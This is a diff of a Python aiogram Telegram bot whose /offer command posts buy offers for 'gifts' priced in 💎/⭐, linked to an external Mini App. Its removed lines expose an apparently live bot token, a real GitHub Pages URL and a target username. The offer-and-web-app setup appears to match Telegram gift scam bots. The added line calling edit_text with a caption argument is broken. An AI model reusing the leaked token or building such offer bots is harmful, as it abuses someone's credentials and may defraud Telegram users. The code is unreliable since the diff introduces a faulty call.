@@ -9,16 +9,13 @@ from aiogram.enums import ParseMode
 from aiogram.filters import Command
 from aiogram.types import (
     Message, CallbackQuery,
-    InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile, WebAppInfo,
+    InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo,
 )
 
-TOKEN = "9056825852:AAH-AKRlntMSkdLMfEbBqB9HsFcPsZFqabA"
+TOKEN = "ТВОЙ_ТОКЕН"
 
-# Ссылка на твой загруженный HTML-файл (обязательно HTTPS!)
-MINI_APP_URL = "https://molniais80-rgb.github.io/miniap/" 
-TARGET_USERNAME = "rattiixx"
+MINI_APP_URL = "ССЫЛКА_НА_ТВОЙ_САЙТ_GITHUB_PAGES" 
 
-PHOTO_FILE_ID = None
 CURRENCY = {"g": "💎", "s": "⭐"}
 
 bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
@@ -49,8 +46,6 @@ def instruction_kb() -> InlineKeyboardMarkup:
 
 @dp.message(Command("offer"))
 async def cmd_offer(message: Message):
-    # ПРОВЕРКА НА АДМИНА УДАЛЕНА. Командой может пользоваться любой.
-    
     args = shlex.split(message.text.partition(" ")[2] or "")
     if len(args) < 3:
         return await message.answer(
@@ -73,8 +68,8 @@ async def cmd_offer(message: Message):
     who = message.from_user.first_name or "Пользователь"
     caption = OFFER_TEXT.format(who=who, sum=raw_sum, cur=CURRENCY[cur_key], name=gift_name(url))
 
-   await message.answer(text=caption, reply_markup=offer_kb(oid))
-    # Если команду ввели в группе, бот удалит исходное сообщение /offer, чтобы было красиво
+    await message.answer(text=caption, reply_markup=offer_kb(oid))
+
     if message.chat.type != "private":
         try:
             await message.delete()
@@ -84,7 +79,7 @@ async def cmd_offer(message: Message):
 @dp.callback_query(F.data.startswith("dec:"))
 async def on_decline(call: CallbackQuery):
     OFFERS.pop(call.data.split(":")[1], None)
-    await call.message.edit_caption(caption="Вы отклонили предложение.", reply_markup=None)
+    await call.message.edit_text(caption="Вы отклонили предложение.", reply_markup=None)
     await call.answer("Отклонено")
 
 @dp.callback_query(F.data.startswith("acc:"))
